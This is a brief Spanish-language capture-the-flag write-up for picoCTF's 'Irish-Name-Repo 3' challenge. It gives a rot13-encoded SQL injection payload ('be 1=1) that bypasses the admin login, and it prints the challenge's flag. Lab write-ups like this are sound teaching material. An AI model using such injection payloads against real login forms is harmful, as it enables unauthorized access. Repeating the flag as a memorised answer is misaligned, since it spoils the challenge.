# Irish-Name-Repo 3
# Objetivos
Hay un sitio web seguro en el que se ejecuta `https://jupiter.challenges.picoctf.org/problem/29132/` ([enlace](https://jupiter.challenges.picoctf.org/problem/29132/)) o http://jupiter.challenges.picoctf.org:29132. ¡Intenta ver si puedes iniciar sesión como administrador!

# Solucion
```bash
password: 'be 1=1;
SQL query: SELECT * FROM admin where password = ''or 1=1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}
```

# Notas adicionales
El log in aplica rot13 en el password ingresado para realizar la inyección debemos realizar lo opuesto, es decir proporcionarle  la inyección con el rot13 ya aplicado
# Referencias
https://www.w3schools.com/sql/sql_injection.asp